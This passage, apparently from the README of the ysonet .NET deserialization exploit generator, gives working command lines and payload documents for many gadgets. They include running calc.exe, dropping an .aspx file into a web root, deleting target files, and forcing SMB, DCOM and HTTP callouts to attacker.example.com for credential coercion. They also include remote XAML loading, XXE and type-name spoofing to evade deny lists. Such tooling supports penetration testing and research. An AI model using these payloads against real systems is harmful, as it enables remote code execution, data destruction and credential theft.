- **Generation is never gated.** Typing the full command for a private module works
  with no flag at all: `ysonet.exe -g <PrivateGadget> -f BinaryFormatter -c calc.exe`.
  The same goes for its own help (`-g <PrivateGadget> --help`) and the module-scoped
  listings (`--list formatters -g <PrivateGadget>`, `--list options -p <PrivatePlugin>`).
- **Errors stay generic.** A typo produces the same message and the same suggestion
  list as before, with the private names simply not in it. Nothing says "private" or
  asks for a flag.

This is not a security control. Anyone with the binary can pass the flag and the
mechanism is in public source; it stops accidental exposure, nothing more. A module
that is both private and `Hidden` still needs `--fullhelp --prv` to show up in help,
because the two rules compose.

## Tips

When specifying complex commands, it can be tedious to escape some special characters (`;`, `|`, `&`, ..). Use the stdin option (`-s`) to read the command from stdin:

```bash
cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
```

`-s` reads the FIRST LINE of standard input, up to 2,050 bytes, as ASCII. A leading UTF-8
byte-order mark is ignored, so a caller that adds one (many do, without meaning to) still
sends the command it typed. An input that carries no command is reported as
`Standard input did not contain a command.` and nothing is generated. A non-empty `-c`
always wins over `-s`.

XmlSerializer and DataContractSerializer formatters generate a wrapper XML format including the expected type in the `type` attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated XML based on how XmlSerializer gets the expected type in your case.

## Examples

### Generate a calc.exe payload for Json.Net using the ObjectDataProvider gadget

```bash
./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```

### Generate a calc.exe payload for BinaryFormatter using the PSObject gadget

```bash
./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### Generate a run_command payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m run_command -c calc.exe
```

### Generate a read_file payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m read_file -f win.ini
```

### Write, copy, move or truncate a file on the target without starting a process

`TypeConfuseDelegateFileOperations` puts a two-string file method in the
TypeConfuseDelegate splice, so the deserializer itself does the file operation.
`--variant` picks the operation and decides what `-c` means, and `--rootcontainer`
picks the serialized root (1 SortedSet, 2 SortedDictionary, 3 TreeSet), exactly as
for the other TypeConfuseDelegate payloads.

```bash
# 1 write: drop the TEXT of a local file onto a target path
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 1 -c "C:\inetpub\wwwroot\a.aspx;payload.aspx"

# 2 copy / 3 move a file, 4 move a directory: both paths are on the TARGET
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 2 -c "C:\work\z-source.txt;C:\work\a-destination.txt"

# 5 empty: create the file, or truncate it if it exists
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 5 -c "C:\work\empty.txt"

# Direct SOAP is available with the native SortedSet (1) and TreeSet (3) roots
./ysonet.exe -g TypeConfuseDelegateFileOperations -f SoapFormatter --rootcontainer 3 \
    --variant 2 -c "C:\work\z-source.txt;C:\work\a-destination.txt"
```

Two things to know:

- Only the FIRST `;` splits the value, so a destination path or embedded text may
  contain more of them. Quote the whole `-c` value in a shell.
- The two strings only have to DIFFER, in either order. ysonet fixes the order the
  payload is built in, so the source path always reaches the operation first
  whatever the two strings sort like. An EQUAL pair is refused: the sorted
  container keeps one element per value, so it would collapse to a single item and
  the payload would do nothing.
- SoapFormatter directly authors rootcontainer 1 and 3 and exposes the native CLR4
  container and `ComparisonComparer<string>` to the target. It uses no Workflow surrogate
  or outer carrier. Rootcontainer 2 is a deeper generic graph and is refused on SOAP.
- The `(5)` formatter annotation counts the five file-operation variants, not root
  choices. SoapFormatter supports all five operations with roots 1 and 3. BinaryFormatter,
  NetDataContractSerializer and LosFormatter support all five operations with all three
  roots.

For variant 1 only, the second field is a file on YOUR machine. Its text is read
and embedded when the payload is built, so it does not need to exist on the
target. The transfer preserves characters, not bytes: a BOM is consumed on read
and `File.WriteAllText` writes UTF-8 without one.

One note on `--minify`: the XML minifier rewrites whitespace inside text content,
which would change the file the target ends up with. ysonet checks the minified
NetDataContractSerializer payload and refuses it when either string was rewritten
(trailing whitespace, a carriage return, and `"; "` are what get changed), instead
of shipping a payload that quietly delivers something else. BinaryFormatter and
LosFormatter carry the strings unchanged, so `--minify` works with them for any
input.

### Choose which ClaimsIdentity member carries a nested BinaryFormatter payload

`ClaimsIdentity.Deserialize` runs an unbindered `BinaryFormatter` on three
`SerializationInfo` names, and `WindowsIdentity` (mscorlib, built in) is the type
that reaches it. All three have the same effect, so `--variant` is there for a
target that filters, schemas, or logs on the member NAME.

```bash
# 1 (default) System.Security.ClaimsIdentity.actor - the shortest, unchanged
./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe"

# 2 System.Security.ClaimsIdentity.bootstrapContext - the WIF-era name
./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" --variant 2

# 3 System.Security.ClaimsIdentity.claims - read back as a List<Claim>
./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" --variant 3
```

Every variant works on all six advertised formatters, and an unknown number falls
back to 1.

`WindowsClaimsIdentity` uses the SAME numbers for the same three keys, so the two
gadgets are learnable together. It adds a fourth: the WIF type's own `_actor`
member, which is a separate sink inside `Microsoft.IdentityModel` rather than
mscorlib's `ClaimsIdentity.Deserialize`. That form has to carry an `IntPtr`
member, which only BinaryFormatter, LosFormatter and NetDataContractSerializer can
express, so `--variant 4` is refused by name on the other three rather than
quietly building a different member. The whole gadget needs
`Microsoft.IdentityModel`, which is not in the GAC.

> Numbering change: `WindowsClaimsIdentity`'s variant numbers used to mean
> different members depending on `-f`. On BinaryFormatter, LosFormatter and
> NetDataContractSerializer, variant 1 was the WIF `_actor` form and 2/3 were
> `.actor`/`.bootstrapContext`; on the other three, 1 was `.actor`, 2 was
> `.bootstrapContext` and 3 silently fell through to 1. Every combination fired,
> so nothing ever failed. If you scripted a variant number against this gadget,
> re-check it: the WIF `_actor` form is now `--variant 4` everywhere it exists,
> and 1/2/3 are `.actor`/`.bootstrapContext`/`.claims` on every formatter.
> `WindowsIdentity` is unaffected.

One thing to watch when chaining: `--bgc` hands the SAME options to every gadget
in the chain, so `--variant` reaches the bridged gadget too. If that gadget does
not know the number, it refuses the chain and names itself in the error.

### Get the DataTable carrier past a type-name filter

`DataTableTypeSpoof` builds exactly the payload `DataTable` builds and writes a
different TYPE NAME on the wire: the name of a real SUBCLASS of
`System.Data.DataTable`. A subclass inherits the protected
`DataTable(SerializationInfo, StreamingContext)` constructor, and that constructor
is what rebuilds the rows, so a target that only rejects the base name by string
still builds the carrier and fires the inner gadget.

```bash
# the default in-box profile: System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection
./ysonet.exe -g DataTableTypeSpoof -f BinaryFormatter -c "calc.exe"

# the second in-box profile, one flag away (same assembly)
./ysonet.exe -g DataTableTypeSpoof -f SoapFormatter -c "calc.exe" \
    --target-type "System.Data.Entity.Design.SsdlGenerator.RelationshipDetailsCollection"

# a typed-DataSet table from the target's own assembly - both strings go on the wire
# verbatim; a nested type uses '+', so OrdersDataSet.OrdersDataTable is written like this:
./ysonet.exe -g DataTableTypeSpoof -f LosFormatter -c "calc.exe" \
    --target-type "Contoso.Data.OrdersDataSet+OrdersDataTable" \
    --target-assembly "Contoso.Data, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
```

What actually goes in the two fields, measured on .NET Framework 4.8.1 (fires = the
payload deserialized and ran):

| `--target-type` | `--target-assembly` | BinaryFormatter | SoapFormatter |
|---|---|---|---|
| `...SsdlGenerator.TableDetailsCollection` (default) | full identity | fires | fires |
| `...SsdlGenerator.RelationshipDetailsCollection` | full identity | fires | fires |
| `System.Data.DataTable` | `System.Data` full identity | fires | fires |
| a typed-DataSet table subclass on the target | that app's assembly | fires | fires |
| a real subclass | partial name or wrong `Version=` | fires | no |
| a type that is not `[Serializable]` | resolvable assembly | no | no |
| any type | an assembly not on the target | no | no |

Three rules explain the table:

- THE ASSEMBLY MUST EXIST ON THE TARGET. ysonet never loads it - only names travel
  on the wire - but the target does, and a name it cannot resolve binds to nothing.
- THE TYPE MUST BE `[Serializable]`. A type that resolves but is not (say
  `SqlConnection`) is rejected before anything is built.
- SOAP IS STRICT, BINARYFORMATTER IS LENIENT ON THE ASSEMBLY NAME. SoapFormatter
  needs the full, correct assembly identity to resolve; a partial name or wrong
  version silently produces nothing. BinaryFormatter falls back to a partial load.
  Use the full identity always - it is what the default ships.

The best real-world names are TYPED DATASET tables: every `.xsd`-generated table
class derives from `TypedTableBase<T>` -> `DataTable` and is `[Serializable]`, so an
application built on typed DataSets has one per table. They are NESTED types, so the
wire name uses `+`: `MyApp.Data.OrdersDataSet+OrdersDataTable`.

Three things to know:

- WHEN THIS HELPS. A deny list, a naive `SerializationBinder`, or a signature that
  matches `System.Data.DataTable` in the bytes. It does nothing against an
  ALLOWLIST, and nothing against a target that does not deserialize a DataTable at
  all. This is the same idea watchTowr used for CVE-2025-23120 in Veeam Backup &
  Replication, where the application's own `DataSet` subclasses walked through a
  deny list that named only the base type.
- IT IS NOT THE `DataSetTypeSpoof` TRICK. That one appends `, x=]` to a real type
  name and relies on how a binder parses the string; the type is still
  `System.Data.DataSet`. Here the name is a type that really exists, and the target
  resolves it normally.
- WHAT THE DEFAULT NEEDS. `System.Data.Entity.Design`, which ships with the full
  .NET Framework (not the Client Profile). If the target does not have it, name a
  subclass it does have (see the typed-DataSet note above). Nothing you type is
  validated - only an empty value is refused - because what a name resolves to is
  the target's decision.
- TWO HALVES OF THE TECHNIQUE. The name getting past the filter is one half; the
  target then rebuilding a real `DataTable` from the payload, through the subclass's
  inherited constructor, is the other. That second half is what matters when the
  target CASTS the deserialized root to `DataTable`, and it needs a name that
  resolves to a real `DataTable` subclass - a bogus name gets the inner gadget to
  fire (it is materialised first) but leaves no usable root object.

`--variant` works exactly as it does on `DataTable`: 1 (default) is the
`TextFormattingRunProperties` inner, 2 is the built-in `TypeConfuseDelegate` inner,
and both work with SoapFormatter. For variant 2 the SOAP table is authored together with
the native CLR4 `SortedSet<string>` / `ComparisonComparer<string>` inner; no generation
alias survives into the returned document.

### Delete files on the target when the object is disposed or collected

`TempFileCollection` targets the `[Serializable]`
`System.CodeDom.Compiler.TempFileCollection` in the .NET Framework's in-box
`System.dll`. The NuGet `System.CodeDom` copy is not `[Serializable]` and cannot
deserialize this payload. The in-box type's cleanup path calls `File.Delete` on
every path it was given. `-c` is the first path, and `--extrafile` adds more -
repeat it once per extra path.

```bash
# one file (a benign, easily recreated file - TempFileCollection DELETES it)
./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\inetpub\wwwroot\robots.txt"

# several files, one --extrafile each
./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\app\a.log" --extrafile "C:\app\b.log" --extrafile "C:\app\c.log"

# a UNC path works too, because File.Delete accepts one
./ysonet.exe -g TempFileCollection -f SoapFormatter -c "\\fileserver\share\report.xlsx"
```

Four things to know:

- THE TIMING IS THE TARGET'S, NOT YOURS. The deletion runs from
  `IDisposable.Dispose()`, which is deterministic but needs the target to dispose
  the object, or from the finalizer, which needs the object to become unreachable
  AND a garbage collection to run its finalizer queue. It can happen at once,
  much later, or never if the process exits first.
- Nothing reports back. The framework wraps each `File.Delete` in its own empty
  `catch`, so a missing file, a locked file and a permission error all look the
  same: silence.
- Every path is a path on the TARGET. It is not opened, resolved or checked on
  your machine, so a relative path resolves against the deserializing process's
  working directory. Paths that differ only by case are collapsed into one entry.
- `-t` is a self-exploit and is genuinely DESTRUCTIVE here. It deserializes the
  payload on your machine, which builds a real `TempFileCollection` holding YOUR
  paths and lets its finalizer DELETE your own files. So `-t` only paths you are
  willing to lose; a `--minify`-rewritten path is refused before `-t` can delete
  anything.

The same path-fidelity rule as above applies, and a little more strictly: because
this gadget deletes what it names, ysonet checks every payload it produces and
refuses one where a path was rewritten. `--minify` on an XML formatter is one
cause; the other is the DataContractSerializer writer, which loses a carriage
return even without `--minify`. BinaryFormatter and LosFormatter carry any path
unchanged.

### Make the target call out over UNC/SMB

`FileSystemInfo` uses `System.IO.FileSystemInfo`, whose serialization constructor
normalizes whatever path you put in `-c`. Normalization expands MS-DOS short
names, and expanding one inside a UNC path means asking the remote host what the
long name is - which is the outbound SMB request.

```bash
# the target resolves attacker.example.com and opens an SMB request to it
./ysonet.exe -g FileSystemInfo -f BinaryFormatter -c "\\attacker.example.com\share\aaaaaa~1\x"

# the same thing as System.IO.FileInfo instead of System.IO.DirectoryInfo
./ysonet.exe -g FileSystemInfo -f Json.NET --variant 2 -c "\\attacker.example.com\share\aaaaaa~1\x"

# a trailing component is not required: the last component counts too
./ysonet.exe -g FileSystemInfo -f SoapFormatter -c "\\attacker.example.com\share\aaaaaa~1"
```

Four things to know:

- THE `~` IS WHAT MAKES IT CALL OUT. mscorlib asks Windows to expand a path only
  when some COMPONENT contains `~` and is at most 12 characters long. So
  `\\host\share\file` reaches nobody, and neither does
  `\\host\share\a-long-name~1\x`, whose `~` component is too long. Nothing is
  refused over this - what a target's path handling really accepts is what you
  are testing - but `--debugmode` tells you when the value you gave cannot
  trigger the expansion.
- IT PROVES A CALLBACK ATTEMPT, NOTHING MORE. A hit means the target resolved
  your host and opened an SMB request. It is not proof of a completed SMB
  session, of NTLM authentication, of captured credentials, or of a relay. Those
  depend on the target, the network and your endpoint.
- THE TWO VARIANTS DO THE SAME THING. `FileSystemInfo` is abstract, so the
  payload names a concrete subclass: variant 1 is `DirectoryInfo` and variant 2
  is `FileInfo`. Both run the same base constructor first, so the callback
  happens before either of their own permission checks. `FileInfo` adds a
  `FileIOPermission` read demand, which only matters if the target runs
  partially trusted.
- `-t` WORKS, and it means what it means everywhere else: the payload is
  deserialized HERE, so YOUR machine performs the callback. Windows sends
  authentication material when it opens an SMB session, so point it only at an
  endpoint you own, and think twice on a machine whose outbound traffic you would
  rather not explain.

The path is the whole payload, so ysonet checks that the payload it emitted still
carries your path exactly and refuses rather than shipping one the XML minifier
rewrote (see the minification note above). `--rawinput` hands both the escaping
and that check to you.

### Make the target fetch and load remote WPF markup

`ResourceDictionary` uses `System.Windows.ResourceDictionary.Source`, a `Uri`
property whose SETTER does the work: it opens a `WebRequest` for whatever you put
in `-c` and then hands the response to the WPF markup loader. That is two effects
from one very short document, and which one you get depends only on what you
point it at.

```bash
# the target fetches your XAML and LOADS it, so whatever the document declares is built
./ysonet.exe -g ResourceDictionary -f Xaml -c "http://attacker.example.com/x.xaml"

# no hosted content needed: opening the SMB session IS the effect
./ysonet.exe -g ResourceDictionary -f Xaml -c "\\attacker.example.com\share\x"

# a path on the target works too - nothing here is resolved on your machine
./ysonet.exe -g ResourceDictionary -f Xaml -c "C:\ProgramData\x.xaml"
```

The whole payload is one element:

```xml
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" Source="http://attacker.example.com/x.xaml"/>
```

Four things to know:

- THE FETCH ALWAYS HAPPENS, THE LOAD NEEDS A TYPE WPF MAPS. The request goes out
  before anything is parsed. What comes back is only turned into objects when WPF
  has a converter for it - `application/xaml+xml` for XAML, `application/baml+xml`
  for compiled BAML. But you usually do not have to set that header at all: when
  the response is labelled `text/plain` or `application/octet-stream` and the URL
  ends in `.xaml` or `.xbap`, WPF DISCARDS the header and picks the type from the
  extension, so a plain static file server works as-is. An unmapped type such as
  `application/x-whatever` does stop it, and you get the callback and nothing more.
- THE UNC FORM SENDS AUTHENTICATION MATERIAL. Windows authenticates when it opens
  an SMB session, so a UNC value is a credential-coercion primitive and needs no
  hosted content at all. Point it only at an endpoint you own.
- XAML IS THE ONLY FORMATTER, and that is measured, not an oversight.
  `ResourceDictionary` implements `IDictionary`, so Json.NET, JavaScriptSerializer
  and YamlDotNet build the object and then file `Source` away as a dictionary KEY
  without ever calling the setter - no error, no request. `Source` is also typed
  `Uri`, which FastJson and both SharpSerializer modes cannot construct from a
  string. The runtime formatters refuse the type outright (it is not
  `[Serializable]`). MessagePack Typeless fails twice over: from MessagePack
  2.5.205 and 3.1.5 it has `System.Windows.ResourceDictionary` on its own
  hardcoded deny list, and below those versions it gives the type a dictionary
  contract, so `Source` travels as a key there too.
- `-t` WORKS, and it means what it means everywhere else: the payload is
  deserialized HERE, so YOUR machine performs the fetch and loads what comes back.

`-c` is taken exactly as you typed it - no scheme check, no host check, no
extension check - because what resolves is the target's decision. The only two
refusals are an empty value and one `--minify` would rewrite: the value lives in
an XML attribute and the XML minifier collapses `"; "`, so ysonet re-reads its own
emitted document and refuses rather than shipping a payload that quietly fetches
a different URL. `--rawinput` hands both the escaping and that check to you.

This replaces `ObjectDataProvider --variant 3 --xamlurl`, and the URL is now an
ordinary `-c`. IF YOU HAVE SCRIPTS: `ObjectDataProvider --var 3` no longer builds
anything - it now fails with a message pointing here. Its `--var 4` fails the same
way and points at the new `WorkflowDesigner` gadget below. Neither number is
reused, so a script that used one gets an error rather than a different payload.
The `TextFormattingRunProperties --xamlurl` option and the SharePoint plugin's
`--useurl` mode are unchanged and now carry this gadget's document.

### Read a file, load a `.resources`, or activate a type through ResXFileRef

`ResXFileRef` carries `[TypeConverter(typeof(Converter))]`, and that converter is
the whole gadget. Given one string - a path, a type name and an optional encoding -
the deserializing process resolves the type with `Type.GetType` and then OPENS THE
PATH. What it does with the bytes depends only on the type name, so the gadget has
three variants and needs no resource file anywhere:

```bash
# variant 1: the target reads the file and hands the TEXT back as the value
./ysonet.exe -g ResXFileRef -f Xaml -c "C:\inetpub\wwwroot\web.config" --variant 1

# variant 1 with an encoding, and a UNC path - opening the SMB session coerces auth
./ysonet.exe -g ResXFileRef -f Xaml -c "\\attacker.example.com\share\web.config" --variant 1 --enc utf-8

# variant 2 (default): the target's ResourceSet reads a .resources file with BinaryFormatter
./ysonet.exe -g ResXFileRef -f YamlDotNet -c "\\attacker.example.com\share\stage.resources" --variant 2

# variant 3: activate the type you name, with the file's bytes as its Stream argument
./ysonet.exe -g ResXFileRef -f Xaml -c "\\attacker.example.com\share\blob.bin" --variant 3 --type "System.IO.BufferedStream, mscorlib"
```

The Xaml payload is one element whose TEXT is the converter value:

```xml
<ResXFileRef xmlns="clr-namespace:System.Resources;assembly=System.Windows.Forms">\\attacker.example.com\share\stage.resources;System.Resources.ResourceSet, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</ResXFileRef>
```

Variant 2 is a two-step chain. Build the second-stage `.resources` with the Resx
plugin, host it on your share, and point `-c` at it:

```bash
# 1. build a BinaryFormatter .resources that runs a command
./ysonet.exe -p Resx -m CompiledDotResources -c calc.exe -of stage.resources
# 2. host stage.resources, then send the ResXFileRef payload from above
```

Things to know:

- THE TYPE NAME DECIDES THE EFFECT. Variant 3 is a bring-your-own variant: what
  happens is decided entirely by the type you name (it needs one public instance
  constructor taking a `Stream`), so it is NOT necessarily code execution and its
  category is `other`, not `code-execution`.
- A PATH WITH `;` IS QUOTED FOR YOU, following `ResXFileRef.ToString()`, because the
  converter reads an unquoted path only up to the first `;`. A path containing `"`
  cannot be expressed - the framework's own parser cannot express it either.
- TWO FORMATTERS, and it is structural. Xaml hands an element's initialization text
  to the converter and YamlDotNet resolves a tagged root scalar and converts it;
  every other serializer either needs a parameterless constructor and a writable
  member (it has neither), rebuilds the object from its fields and never runs the
  converter (a clean round trip that reads nothing), or has nowhere to declare the
  type. The `RestrictiveXamlXmlReader` used by the WPF clipboard and XPS sinks drops
  this payload silently.
- `-t` IS ACCEPTED ON EVERY VARIANT, because in ysonet `-t` is a self-exploit: it
  deserializes the payload on YOUR machine, so the effect fires on you. Variant 1 reads
  the file back, variant 2 runs a BinaryFormatter over the `.resources` you point `-c` at,
  variant 3 activates your named type - all in the ysonet process. Only `-t` a file and a
  type you trust, because you are running them on yourself.

The Resx plugin reaches the SAME converter through a RESX document, and its
`indirect_resx_file` mode now takes the same knobs. The default is byte-for-byte
what it always emitted, so existing commands are unchanged:

```bash
# unchanged default: names ResXResourceSet, loads the file as a .resources document
./ysonet.exe -p Resx -m indirect_resx_file -F "\\attacker.example.com\share\stage.resources"

# read the file back instead, in a chosen encoding
./ysonet.exe -p Resx -m indirect_resx_file -F "\\attacker.example.com\share\web.config" --type "System.String" --enc utf-8
```

### Smuggle a XAML payload as a plain string

`WorkflowDesigner` uses
`System.Activities.Presentation.WorkflowDesigner.PropertyInspectorFontAndColorData`,
a public string property with a SETTER AND NO GETTER whose setter runs
`XamlReader.Load` on whatever it is given. So the whole payload is one type name
and one string member, and that string is a XAML document.

```bash
# the default inner document: a Hashtable holding an ObjectDataProvider that runs -c
./ysonet.exe -g WorkflowDesigner -f Json.NET -c "calc.exe"

# same technique through a formatter the old ObjectDataProvider wrapper could not reach
./ysonet.exe -g WorkflowDesigner -f MessagePackTypeless -c "calc.exe" -o base64

# bring your own XAML: any Xaml gadget can be the inner payload
./ysonet.exe -g WorkflowDesigner -bgc ObjectDataProvider -f Json.NET -c "calc.exe"
```

The Json.NET form is two lines:

```json
{
    "$type":"System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "PropertyInspectorFontAndColorData":"<the XAML document, escaped for this string>"
}
```

Four things to know:

- WHY IT REACHES EIGHT FORMATTERS WHEN THE MEMBER CANNOT BE READ. That is the
  interesting part, and it cuts the other way from what you would expect. A
  serializer that builds its member list from a read-AND-write contract never sees
  a write-only property: it resolves the type, constructs it, and assigns nothing.
  The eight that work either look the member up by name at assignment time or keep
  a member whose setter exists without a getter. `YamlDotNet` is the one that does
  not, and it says so rather than failing quietly. The runtime formatters
  (BinaryFormatter, SoapFormatter, LosFormatter, FsPickler) are out because the
  type is not `[Serializable]`, and the DataContract family and `XmlSerializer` are
  out because a POCO contract needs read-write members.
- IT IS NOT AN XXE PRIMITIVE. The setter builds its `XmlReader` with
  `XmlResolver = null`, so no DTD or external entity is fetched. What you get is
  XAML OBJECT CONSTRUCTION, which is why the inner payload is a gadget rather than
  a URL.
- THE TARGET NEEDS AN STA THREAD, and `System.Activities.Presentation`. The
  constructor builds WPF objects and creates a `System.Windows.Application` when
  the process has none, so a payload that lands on a plain worker thread throws
  before the member is ever assigned. `-t` handles this for you.
- THE LOADED ROOT SHOULD BE A `Hashtable`. The setter casts the result of
  `XamlReader.Load` to one. The cast runs AFTER the document has been built, so a
  different root still fires and then throws - but the default inner document uses
  a `Hashtable` root so the setter completes cleanly, and a bridged payload can do
  the same if you care about that.

This replaces `ObjectDataProvider --variant 4`, which existed only when the outer
formatter was already Xaml.

### Turn a XAML-only sink into a NetDataContractSerializer sink

`DynamicUpdateMapExtension` is a public `MarkupExtension` in `System.Activities`
whose content property hands its XML straight to
`NetDataContractSerializer.ReadObject`, with no binder and no known-type list. So a
host that only ever parses XAML - `XamlServices.Load`, `ActivityXamlServices.Load`
for a `.xamlx` workflow file, `WorkflowDesigner.Load(fileName)`,
`System.Windows.Markup.XamlReader.Load` - can be given any NDCS gadget in this
tool.

```bash
# the default inner payload: TypeConfuseDelegate through NetDataContractSerializer
./ysonet.exe -g DynamicUpdateMapExtension -f Xaml -c "calc.exe"

# bring your own inner chain: any gadget that supports NetDataContractSerializer
./ysonet.exe -g DynamicUpdateMapExtension -bgc WindowsIdentity -f Xaml -c "calc.exe"

# carry the whole thing through a non-XAML formatter by chaining it as a Xaml inner
./ysonet.exe -g WorkflowDesigner -bgc DynamicUpdateMapExtension -f Json.NET -c "calc.exe"
```

The document is short, and its shape is the whole technique:

```xml
<DynamicUpdateMapExtension xmlns="clr-namespace:System.Activities.XamlIntegration;assembly=System.Activities"
                           xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <DynamicUpdateMapExtension.XmlContent>
    <x:XData>
      <!-- the NetDataContractSerializer document, as literal XML -->
    </x:XData>
  </DynamicUpdateMapExtension.XmlContent>
</DynamicUpdateMapExtension>
```

Three things to know:

- THE `<x:XData>` WRAPPER IS LOAD BEARING. The XAML scanner treats markup as
  literal XML only for that one element; the object writer then sees an `XData`
  value on a member whose type is `IXmlSerializable`, reads the property, and calls
  `ReadXml` on what it got back. Nest the inner document directly under
  `<DynamicUpdateMapExtension.XmlContent>` instead and the parser tries to resolve
  its root as a XAML type, failing with "Cannot create unknown type" without ever
  reaching the serializer.
- A FAILED LOAD IS THE NORMAL OUTCOME. `ReadXml` casts the result to
  `DynamicUpdateMap` AFTER `ReadObject` has returned, so the inner chain has already
  run by the time you see the `InvalidCastException`. Do not read that error as "the
  payload did not work".
- XAML IS THE ONLY FORMATTER, because the sink is a XAML parser feature rather than
  a member assignment: no other serializer calls `ReadXml`, `XmlContent` has no
  setter, the type is not `[Serializable]`, and a data contract is built from
  read-write members. To reach it from another format, chain this gadget INTO a
  consumer that takes a Xaml inner payload, as in the third example above.

Where it does NOT land: the restrictive XAML reader behind the CVE-2020-0605/0606
mitigation, which the WPF clipboard and XPS sinks use, drops this payload. Its
five named types (`ObjectDataProvider`, `ResourceDictionary`, `AssemblyInstaller`,
`WorkflowDesigner`, `BindingSource`) look like a blocklist, but the check is really
an ALLOWLIST: it keeps only a `DependencyObject` subclass in the `System.Windows`
namespaces, a primitive, or a type an administrator allowed in the registry, and
silently skips every other subtree - no exception, nothing built, no effect. That
is a property of that one reader; `XamlServices.Load` and
`ActivityXamlServices.Load`, which is where this gadget is aimed, use the default
schema context and are unaffected.

### Make the target call out over DCOM/RPC

`WbemClassObjectUnmarshal` uses
`System.Management.IWbemClassObjectFreeThreaded`, whose serialization constructor
hands one `byte[]` member straight to native `CoUnmarshalInterface`. By default
ysonet builds an `OBJREF_STANDARD` for you from `-c`, naming a host and an object
exporter the target cannot know, so the target has to resolve that host name and
connect to it before it can fail.

```bash
# the target resolves attacker.example.com and connects to it on RPC port 135
./ysonet.exe -g WbemClassObjectUnmarshal -f BinaryFormatter -c "attacker.example.com"

# an IP works, and so does an IPv6 literal
./ysonet.exe -g WbemClassObjectUnmarshal -f Json.NET -c "10.0.0.5"

# ship a blob you built yourself, byte for byte
./ysonet.exe -g WbemClassObjectUnmarshal -f SoapFormatter --variant 2 -c "C:\work\objref.bin"

# put a PUBLIC type at the root instead of the internal one, same payload underneath
./ysonet.exe -g WbemClassObjectUnmarshal -f BinaryFormatter -c "attacker.example.com" --rootcarrier 2
```

Four things to know:

- YOU DO NOT CHOOSE THE PORT. OXID resolution ignores the endpoint inside an RPC
  string binding and always talks to port 135. So `-c "host:135"` and
  `-c "host[135]"` are refused rather than quietly stripped, because stripping
  them would build a payload that does something other than what you asked for.
  An IPv6 literal like `::1` is still accepted - the rule is "no port", not "no
  colon".
- IT PROVES A CONNECTION, NOT NTLM COERCION. The resolver call is not
  authenticated. Treat a hit as "the target reached me", nothing more.
- The payload always ends in a COM error on the target, and that is normal: the
  callback has already happened by the time it fails. `OR_INVALID_OXID`
  (`0x80070776`) means your host answered; `RPC_S_SERVER_UNAVAILABLE`
  (`0x800706BA`) means nothing answered on port 135. Watch for the DNS lookup if
  outbound 135 is blocked - the name is resolved first either way.
- `-t` works for variant 1, and it means what it means everywhere else: the
  payload is deserialized HERE, so YOUR machine performs the callback. That is
  the quick way to check the payload and your listener. Add `--debugmode` to see
  the COM error it ends with. It is refused for variant 2 only, because that
  would feed your own unparsed bytes to native COM on this machine.

The two variants are not two different effects. Both hand a `byte[]` to
`CoUnmarshalInterface` on the target; they differ only in who writes those bytes.
Variant 1 writes them for you from a host name. Variant 2 reads a file you wrote
yourself (readable, non-empty, up to 1 MiB) and ships it byte for byte.

So variant 2 is an escape hatch, NOT a stronger variant 1 and NOT a
code-execution variant. ysonet does not parse or understand your blob, so the
effect is entirely whatever those bytes mean on the target - which may be
nothing, a callout of your own design, or a crash. It gives you the delivery
channel and nothing else. Use it when you have built a blob variant 1 cannot
express, such as an `OBJREF_CUSTOM`.

Note also that capturing a real marshalled `IWbemClassObject` does NOT give you
variant 1's behaviour: WMI marshals such an object by value as an
`OBJREF_CUSTOM`, which names no host at all.

`--rootcarrier` is a separate question from `--variant`, and it only changes the
TYPE NAME at the root of the payload. Carrier 1 (the default) is the bare
`IWbemClassObjectFreeThreaded`, which is internal to `System.Management`. Carrier 2
wraps it in the public `System.Management.ManagementBaseObject`, which passes it to
exactly the same constructor, so the blob, the input and the effect are identical.
Reach for it in two cases: when the target names its own root type, because a plain
`DataContractSerializer` consumer can only ever name a public one; and when you are
testing a rule that keys on the internal name. It is NOT a `SerializationBinder`
bypass - a binder sees every type in the stream, the nested one included - and it
costs two formatters: `DataContractSerializer` has nowhere to name the internal
inner type, and FsPickler refuses `ManagementBaseObject` outright because it derives
from `MarshalByRefObject`. Both cells are refused with a message that says so.

### Make the target fetch an external DTD (legacy XXE)

`DataViewManagerXxe` sets `System.Data.DataViewManager.DataViewSettingCollectionString`.
That setter parses the value with a legacy `XmlTextReader`, so a DOCTYPE with an
external parameter entity makes the target fetch a URL you choose. `-c` is that
URL.

```bash
# the five formatters that can reach the setter
./ysonet.exe -g DataViewManagerXxe -f Xaml -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f JavaScriptSerializer -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f FastJson -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f SharpSerializerXml -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f SharpSerializerBinary -c "http://10.0.0.5:8080/x.dtd"
```

Four things to know:

- IT ONLY FIRES ON A TARGET WITH THE OLD XML DEFAULTS. Since .NET Framework
  4.5.2 a legacy `XmlTextReader` is built with no resolver, so nothing is
  fetched. It still fires when the deserializing application TARGETS an earlier
